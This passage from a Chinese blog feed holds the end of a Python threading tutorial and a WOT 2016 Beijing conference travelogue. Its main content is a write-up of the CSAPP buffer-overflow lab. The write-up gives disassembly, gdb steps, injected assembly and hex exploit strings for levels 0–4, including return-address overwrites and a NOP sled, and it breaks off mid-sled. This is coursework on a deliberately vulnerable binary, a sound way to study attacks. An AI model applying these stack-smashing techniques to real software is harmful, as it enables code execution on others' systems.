        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        rlock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> result

t1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>showresult<span class="token punctuation">)</span>
t2<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>clearresult<span class="token punctuation">)</span>

t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="Condition"><a href="#Condition" class="headerlink" title="Condition"></a>Condition</h3><p>条件同步机制是指：一个线程等待特定条件，而另一个线程发出特定条件满足的信号。 解释条件同步机制的一个很好的例子就是生产者/消费者（producer/consumer）模型。</p>
<p><img src="http://www.laurentluce.com/images/blog/threads/condition.png" alt=""></p>
<h3 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h3><p>信号量同步基于内部计数器，每调用一次acquire()，计数器减1；每调用一次release()，计数器加1.当计数器为0时，acquire()调用被阻塞。</p>
<h3 id="Event"><a href="#Event" class="headerlink" title="Event"></a>Event</h3><p>基于事件的同步是指：一个线程发送/传递事件，另外的线程等待事件的触发。在set()时， 其他线程就被唤醒执行。</p>
<p><img src="http://www.laurentluce.com/images/blog/threads/event.png" alt=""></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span>

<span class="token keyword">import</span> threading<span class="token punctuation">,</span> time
<span class="token keyword">import</span> random

<span class="token keyword">class</span> <span class="token class-name">Producer</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token triple-quoted-string string">"""
  向列表中生产随机整数
  """</span>

  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> integers<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    构造器

    @param integers 整数列表
    @param event 事件同步对象
    """</span>
    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    self<span class="token punctuation">.</span>integers <span class="token operator">=</span> integers
    self<span class="token punctuation">.</span>event <span class="token operator">=</span> event

  <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    实现Thread的run方法。在随机时间向列表中添加一个随机整数
    """</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
      integer <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span>
      self<span class="token punctuation">.</span>integers<span class="token punctuation">.</span>append<span class="token punctuation">(</span>integer<span class="token punctuation">)</span>
      <span class="token keyword">print</span> <span class="token string">'%d appended to list by %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>integer<span class="token punctuation">,</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
      <span class="token keyword">print</span> <span class="token string">'event set by %s'</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>name
      self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#设置事件</span>
      self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#发送事件</span>
      <span class="token keyword">print</span> <span class="token string">'event cleared by %s'</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>name
      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Consumer</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token triple-quoted-string string">"""
   从列表中消费整数
  """</span>

  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> integers<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    构造器

    @param integers 整数列表
    @param event 事件同步对象
    """</span>
    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    self<span class="token punctuation">.</span>integers <span class="token operator">=</span> integers
    self<span class="token punctuation">.</span>event <span class="token operator">=</span> event

  <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    实现Thread的run()方法，从列表中消费整数
    """</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
      self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#等待事件被触发</span>
      <span class="token keyword">try</span><span class="token punctuation">:</span>
        integer <span class="token operator">=</span> self<span class="token punctuation">.</span>integers<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">'%d popped from list by %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>integer<span class="token punctuation">,</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
      <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># catch pop on empty list</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    integers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t1 <span class="token operator">=</span> Producer<span class="token punctuation">(</span>integers<span class="token punctuation">,</span> event<span class="token punctuation">)</span>
    t2 <span class="token operator">=</span> Consumer<span class="token punctuation">(</span>integers<span class="token punctuation">,</span> event<span class="token punctuation">)</span>
    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[我与北京与WOT 2016]]></title>
      <url>http://xinqiu.me/2016/04/15/WOT2016/</url>
      <content type="html"><![CDATA[<p>从小到大，之前都没去过北京。一是对故宫长城并没有什么兴趣(毕竟只对吃感兴趣括弧笑)，二是总觉得北京那算是大都市，自己还是太Low了。机缘巧合，得到了张WOT 2016的票，再三犹豫之后还是毅然决定踏上旅程。唉，还是准备不重复，当初还以为北京的火车票应该不是那么难买，结果就先买了去的车票，几天以后才买回程的票，结果因为买迟了，足足少在北京玩2个小时。</p>
<a id="more"></a>
<p>关于请假还是有个小插曲，感觉被书记故意刁难了。我先向班主任请假，班主任说要请示书记。书记一开始不同意，我就搞不懂了，大学生不出去走走，怎么才能了解外面的世界？然后又说去问专业老师或院长的意见。我就屁颠屁颠的去问了专业老师，专业老师觉得如果我想去就去玩玩好了，回头和书记说，却被驳回说要向院长申请。我又找专业老师，让他联系一下院长。倒是院长同意了，让我按照请假流程请假。回来请假的时候，书记又说要院长和专业老师的签字。我真的无语了，难怪我们学校信息学院这么烂，大部分老师都是认为学生这么垃圾，还是安心读书到时候大四去参加培训班之后找个外包公司安度晚年异或争取考研考公考事业编什么的。</p>
<p>第一次一个人出这么远的门，感觉爸妈都有点不是很放心。开始的紧张在脚踏北京的地上时就已经不在紧张了。感觉只要有手机，基本上就什么都不怕了。不管是买早饭还是用地图。</p>
<p>早早的来到了北京珠三角JW万豪酒店</p>
<p><img src="JW.jpg" alt=""></p>
<p>看到了广告牌</p>
<p><img src="1.jpg" alt=""></p>
<p>随后签到拿到了嘉宾牌，场外的人还挺多的。</p>
<p><img src="2.jpg" alt=""></p>
<p>第一次感受了这种氛围，大部分人都是工作的人，学生还是挺少的。大一曾经憧憬过运维这个职业，现在比较火的是DevOps。在开会之前的一段时间，我就开始闲逛时间，顺便各种关注微信公众号抽奖什么的233。一路的不少公司展区都被我搜刮了小礼品。AWS抽到的笔意外的好写。</p>
<p><img src="3.jpg" alt=""></p>
<p>这是主会场开会前每个座位上放的广告大礼包233.之后就是会议开始， 早上的是集中会议，虽然离我很遥远，但一些思想我觉得还是正确的。</p>
<p><img src="4.jpg" alt=""></p>
<p>中午在KFC用了次Apple Pay，小额免密，圆了一次绑上银行卡后一直没用的遗憾。</p>
<p>下午本来想去听C会场，结果一脸懵逼，全是人。只好去了人不是很多的B安全会场。看到了道哥，真的年轻。这些公司的PPT真的不是盖的，演讲的档次真的不一样，想到当年参加锐聘的比赛做的Keynote，简直黑历史。</p>
<p>之后因为要约一约北京的同学，就提前离开了会场。走前问了主办方才知道，原来我这个票是可以看两天的，被送票方骗了&gt; &lt;,不然就可以在北京多玩一天了。和同学吃了北京的烧烤，还挺有特色，果然每个地方的烧烤口味都是有区别的。</p>
<p><img src="5.jpg" alt=""></p>
<p><img src="6.jpg" alt=""></p>
<p>好想有机会再去北京玩玩，这次还有个遗憾是没吃炸酱面。北京之旅让我深有感触，加深了要更加努力的决心。在最近最不想学习的时候来了次北京打了针鸡血，但愿能维持长一段时间。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CSAPP Lab3 解题分析]]></title>
      <url>http://xinqiu.me/2016/03/30/csapp-lab3-buflab/</url>
      <content type="html"><![CDATA[<p>首先，使用tar xvf命令解压文件后，会有3个可执行的二进制文件bufbomb，hex2raw，makecookie。参考<a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf" target="_blank" rel="external">write-up</a>。</p>
<!--toc-->
<h2 id="Level_0"><a href="#Level_0" class="headerlink" title="Level 0"></a>Level 0</h2><p>Bufbomb程序运行会读一个字符串，使用一下函数getbuf:</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* Buffer size for getbuf */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> NORMAL_BUFFER_SIZE 32</span>

<span class="token keyword">int</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>NORMAL_BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">Gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Gets函数和标准库的gets功能比较相似，是读取字符串。因为Gets没有办法判断是否buf足够大，所以要用一个函数去判断长度是否小于32。将字符串传入getbuf函数中，若字符串小于32，则返回1.</p>
<pre><code>080491f4 &lt;getbuf&gt;:
 80491f4:    55                       push   %ebp
 80491f5:    89 e5                    mov    %esp,%ebp
 80491f7:    83 ec 38                 sub    $0x38,%esp
 80491fa:    8d 45 d8                 lea    -0x28(%ebp),%eax
 80491fd:    89 04 24                 mov    %eax,(%esp)
 8049200:    e8 f5 fa ff ff           call   8048cfa &lt;Gets&gt;
 8049205:    b8 01 00 00 00           mov    $0x1,%eax
 804920a:    c9                       leave  
 804920b:    c3                       ret
</code></pre><p>getbuf是由函数test调用:</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   
  <span class="token keyword">int</span> val<span class="token punctuation">;</span>   
  <span class="token comment" spellcheck="true">/* Put canary on stack to detect possiblecorruption */</span>   
  <span class="token keyword">volatile</span> <span class="token keyword">int</span> local <span class="token operator">=</span> <span class="token function">uniqueval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   

  val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   

  <span class="token comment" spellcheck="true">/* Check for corruption stack */</span>   
  <span class="token keyword">if</span> <span class="token punctuation">(</span>local <span class="token operator">!=</span> <span class="token function">uniqueval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Sabotaged!: the stack has beencorrupted\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
  <span class="token punctuation">}</span>   
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>   
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Boom!: getbuf returned0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>   
    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Dud: getbuf returned0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>   
  <span class="token punctuation">}</span>   
<span class="token punctuation">}</span>
</code></pre>
<p>其中，Smoke源码： </p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">smoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Smoke!: You calledsmoke()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
  <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
<span class="token punctuation">}</span>
</code></pre>
<p>level 0 的任务是让getbuf在执行后返回时，执行smoke函数，而不是返回test函数中。</p>
<a id="more"></a>
<p>关于堆栈，可以参考书中的这张图 <img src="stack-frame-structure.png" alt=""></p>
<p>根据上面的汇编代码，可以知道，首先push保存了堆指针(frame pointer)，然后%ebp保存帧指针(stack pointer)，%esp减0x38。lea把buf的指针地址-0x28(%ebp)传给了Gets函数。所以可以画出堆栈图</p>
<pre><code>+---------------+
|               |
| getbuf返回地址 |
|               |
+---------------+
|               |
|     %ebp      |
|               |
+---------------+
|               |
|               |
|               |
|      buf      |
|               |
|    40 byte    |
|               |
|               |
|               |
+---------------+
|               |
|     %esp      |
|               |
+---------------+
</code></pre><p>所以为了修改getbuf返回地址，需要在从buf开始，填充 40 + 4 = 44个字节，并且按照要求，这44个字节要是非0a数。根据汇编得到的smoke地址为08048c18，又因为是电脑小端法，所以构建的文本可以是这样的</p>
<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08
</code></pre><h2 id="Level_1"><a href="#Level_1" class="headerlink" title="Level 1"></a>Level 1</h2><p>bufbomb中有个函数fizz:</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">fizz</span><span class="token punctuation">(</span><span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fizz!: You calledfizz(0x%x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You calledfizz(0x%x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>
</code></pre>
<p>题目要求和level 0类似，就是让程序执行fizz而不是返回test。区别就是这个fizz函数要求传入参数，而且传入的参数必须是自己的cookie。</p>
<pre><code>08048c42 &lt;fizz&gt;:
 8048c42: 55                    push   %ebp
 8048c43: 89 e5                 mov    %esp,%ebp
 8048c45: 83 ec 18              sub    $0x18,%esp
 8048c48: 8b 45 08              mov    0x8(%ebp),%eax
 8048c4b: 3b 05 08 d1 04 08     cmp    0x804d108,%eax
 8048c51: 75 26                 jne    8048c79 &lt;fizz+0x37&gt;
 8048c53: 89 44 24 08           mov    %eax,0x8(%esp)
 8048c57: c7 44 24 04 ee a4 04  movl   $0x804a4ee,0x4(%esp)
 8048c5e: 08 
 8048c5f: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
 8048c66: e8 55 fd ff ff        call   80489c0 &lt;__printf_chk@plt&gt;
 8048c6b: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
 8048c72: e8 04 07 00 00        call   804937b &lt;validate&gt;
 8048c77: eb 18                 jmp    8048c91 &lt;fizz+0x4f&gt;
 8048c79: 89 44 24 08           mov    %eax,0x8(%esp)
 8048c7d: c7 44 24 04 40 a3 04  movl   $0x804a340,0x4(%esp)
 8048c84: 08 
 8048c85: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
 8048c8c: e8 2f fd ff ff        call   80489c0 &lt;__printf_chk@plt&gt;
 8048c91: c7 04 24 00 00 00 00  movl   $0x0,(%esp)
 8048c98: e8 63 fc ff ff        call   8048900 &lt;exit@plt&gt;
</code></pre><p>通过反汇编，可以发现变量val存在0x8(%ebp)这个位置，所以需要将0x8(%ebp)位置的值修改为cookie。首先前面的44位用非0a数填充，接着应该用fizz的地址08048c42替换原来的返回地址。然后添加4个非0a数，之后就应该添加cookie了。注意cookie也是用到小端表示。</p>
<p>所以构成了:</p>
<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 88 41 9d 21
</code></pre><h2 id="Level_2"><a href="#Level_2" class="headerlink" title="Level 2"></a>Level 2</h2><p>让getbuf调用后执行bang函数，同时修改global_value。因为global_value是全局变量，所以并没储存在栈中。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> global_value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">bang</span><span class="token punctuation">(</span><span class="token keyword">int</span> val<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>global_value <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Bang!: You set global_value to 0x%x\n"</span><span class="token punctuation">,</span> global_value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: global_value = 0x%x\n"</span><span class="token punctuation">,</span> global_value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>通过反汇编:</p>
<pre><code>08048c9d &lt;bang&gt;:
 8048c9d: 55                    push   %ebp
 8048c9e: 89 e5                 mov    %esp,%ebp
 8048ca0: 83 ec 18              sub    $0x18,%esp
 8048ca3: a1 00 d1 04 08        mov    0x804d100,%eax
 8048ca8: 3b 05 08 d1 04 08     cmp    0x804d108,%eax
 8048cae: 75 26                 jne    8048cd6 &lt;bang+0x39&gt;
 8048cb0: 89 44 24 08           mov    %eax,0x8(%esp)
 8048cb4: c7 44 24 04 60 a3 04  movl   $0x804a360,0x4(%esp)
 8048cbb: 08 
 8048cbc: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
 8048cc3: e8 f8 fc ff ff        call   80489c0 &lt;__printf_chk@plt&gt;
 8048cc8: c7 04 24 02 00 00 00  movl   $0x2,(%esp)
 8048ccf: e8 a7 06 00 00        call   804937b &lt;validate&gt;
 8048cd4: eb 18                 jmp    8048cee &lt;bang+0x51&gt;
 8048cd6: 89 44 24 08           mov    %eax,0x8(%esp)
 8048cda: c7 44 24 04 0c a5 04  movl   $0x804a50c,0x4(%esp)
 8048ce1: 08 
 8048ce2: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
 8048ce9: e8 d2 fc ff ff        call   80489c0 &lt;__printf_chk@plt&gt;
 8048cee: c7 04 24 00 00 00 00  movl   $0x0,(%esp)
 8048cf5: e8 06 fc ff ff        call   8048900 &lt;exit@plt&gt;
</code></pre><p>在gdb中先在getbuf处设置断点， 接着</p>
<pre><code>(gdb) r -u xinqiu
</code></pre><p>让其继续运行到断点处。根据上述的反汇编代码，用 <code>x/i 0x804d100</code> 得到</p>
<pre><code>(gdb) x/i 0x804d100
   0x804d100 &lt;global_value&gt;:  add    %al,(%eax)
</code></pre><p>可以知道0x804d100放的是global_value。如果想执行某一个函数，那么就把该函数的入口地址入栈。所以能写出漏洞利用代码，将cookie传入全局变量的地址中，然后将bang的入口地址入栈，接着用ret运行。将以下汇编代码保存到level2.S中。</p>
<pre><code>movl $0x219d4188,0x804d100
pushl $0x08048c9d
ret
</code></pre><p>按照writeup，使用</p>
<pre class=" language-bash"><code class="language-bash">gcc -m32 -c level2.S
</code></pre>
<p>编译，再用objdump反汇编</p>
<pre class=" language-bash"><code class="language-bash">objdump -d level2.o <span class="token operator">></span> level2.d
</code></pre>
<p>通过查看level2.d</p>
<pre><code>
level2.o:     file format elf32-i386


Disassembly of section .text:

00000000 &lt;.text&gt;:
   0: c7 05 00 d1 04 08 88  movl   $0x219d4188,0x804d100
   7: 41 9d 21 
   a: 68 9d 8c 04 08        push   $0x8048c9d
   f: c3                    ret
</code></pre><p>将getbuf的返回地址改成buf的首地址运行，上一个栈的4字节改成bang函数的地址。这样当在getbuf中调用ret返回时程序会跳转到buf处上面的构造的恶意函数（指令），再通过恶意函数中的ret指令跳转原栈中bang的入口地址，再进入bang函数中执行。</p>
<p>为了得到buf的运行地址，可以使用gdb来获取</p>
<pre><code>(gdb) p/x ($ebp-0x28)
$1 = 0x55683168
</code></pre><p>现在可以构造文本文件level2.txt,首先前40个字节中先用level2.d左边的操作码填充，剩余空位用00填充，接着用4个00覆盖保存的%ebp地址，最后将恶意函数的入口地址覆盖原来的返回地址，通过ret执行这个恶意函数。</p>
<pre><code>c7 05 00 d1 04 08 88 41 9d 21 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 31 68 55
</code></pre><h2 id="Level_3"><a href="#Level_3" class="headerlink" title="Level 3"></a>Level 3</h2><p>让getbuf正常返回到test函数，同时返回值为cookie。所以需要恢复被破坏的栈环境，将溢出前的正确的返回地址入栈，然后执行ret。因为getbuf的返回值在%eax寄存器中，溢出时会覆盖%ebp，所以需要进行恢复。</p>
<p>使用GDB</p>
<pre><code>(gdb) b test
</code></pre><p>接着</p>
<pre><code>(gdb) r -u xinqiu
</code></pre><p>通过查看pc寄存器的位置</p>
<pre><code>(gdb) x/10i $pc
=&gt; 0x8048dae &lt;test+4&gt;:  sub    $0x24,%esp
   0x8048db1 &lt;test+7&gt;:  call   0x8048d90 &lt;uniqueval&gt;
   0x8048db6 &lt;test+12&gt;: mov    %eax,-0xc(%ebp)
   0x8048db9 &lt;test+15&gt;: call   0x80491f4 &lt;getbuf&gt;
   0x8048dbe &lt;test+20&gt;: mov    %eax,%ebx
   0x8048dc0 &lt;test+22&gt;: call   0x8048d90 &lt;uniqueval&gt;
   0x8048dc5 &lt;test+27&gt;: mov    -0xc(%ebp),%edx
   0x8048dc8 &lt;test+30&gt;: cmp    %edx,%eax
   0x8048dca &lt;test+32&gt;: je     0x8048dda &lt;test+48&gt;
   0x8048dcc &lt;test+34&gt;: movl   $0x804a388,(%esp)
</code></pre><p>可以知道在getbuf函数返回后的一条指令是 <code>0x8048dbe</code>。</p>
<p>下面就是要构造攻击代码。需要将cookie传入eax寄存器，接着通过push入栈，ret返回来继续执行之后的代码。</p>
<pre><code>mov $0x219d4188,%eax
push $0x08048dbe
ret
</code></pre><p>类似Level 2的操作，可以得到攻击文本文件</p>
<pre><code>b8 88 41 9d 21 68 be 8d 04 08
c3 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00
c0 31 68 55
68 31 68 55
</code></pre><p>其中，倒数第二行是保存的ebp寄存器地址。</p>
<h2 id="Level_4"><a href="#Level_4" class="headerlink" title="Level 4"></a>Level 4</h2><p>首先通过反汇编得到:</p>
<pre><code>0804920c &lt;getbufn&gt;:
 804920c: 55                    push   %ebp
 804920d: 89 e5                 mov    %esp,%ebp
 804920f: 81 ec 18 02 00 00     sub    $0x218,%esp
 8049215: 8d 85 f8 fd ff ff     lea    -0x208(%ebp),%eax
 804921b: 89 04 24              mov    %eax,(%esp)
 804921e: e8 d7 fa ff ff        call   8048cfa &lt;Gets&gt;
 8049223: b8 01 00 00 00        mov    $0x1,%eax
 8049228: c9                    leave  
 8049229: c3                    ret    
 804922a: 90                    nop
 804922b: 90                    nop
</code></pre><p>通过 p/x ($ebp-0x208) 可以知道buf的首地址为 0x55682f88，且buf为520个字节大小。因为getbufn被执行了五次，通过gdb continue 5次，每次都查看buf地址，可以得到每次的首地址。</p>
<pre><code>0x55682f88
0x55682f48
0x55682fe8
0x55682f28
0x55682f08
</code></pre><p>根据testn的前一部分反汇编代码</p>
<pre><code> 08048e26 &lt;testn&gt;:
 8048e26: 55                    push   %ebp
 8048e27: 89 e5                 mov    %esp,%ebp
 8048e29: 53                    push   %ebx
 8048e2a: 83 ec 24              sub    $0x24,%esp
 8048e2d: e8 5e ff ff ff        call   8048d90 &lt;uniqueval&gt;
 8048e32: 89 45 f4              mov    %eax,-0xc(%ebp)
 8048e35: e8 d2 03 00 00        call   804920c &lt;getbufn&gt;
 8048e3a: 89 c3                 mov    %eax,%ebx
</code></pre><p>esp和ebp寄存器相等，所以当 push %ebx 时， 此时的 %ebp = %esp + 0x4, sub    $0x24,%esp 之后， %ebp = %esp + 0x28,这个就是%esp和%ebp每次的变化关系。此外可以知道call getbufn的下一条指令的地址为 0x8048e3a。</p>
<p>所以得出汇编代码</p>
<pre><code>lea 0x28(%esp),%ebp
mov $0x219d4188,%eax
push $0x8048e3a
ret
</code></pre><p>根据建议， buf的520个自己空间加上返回地址和ebp共528个字节，去掉返回地址和攻击的指令字节码，剩余的都用nop也就是0x90填充。也就是509个nop形成”nop sled”。</p>
<pre><code>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
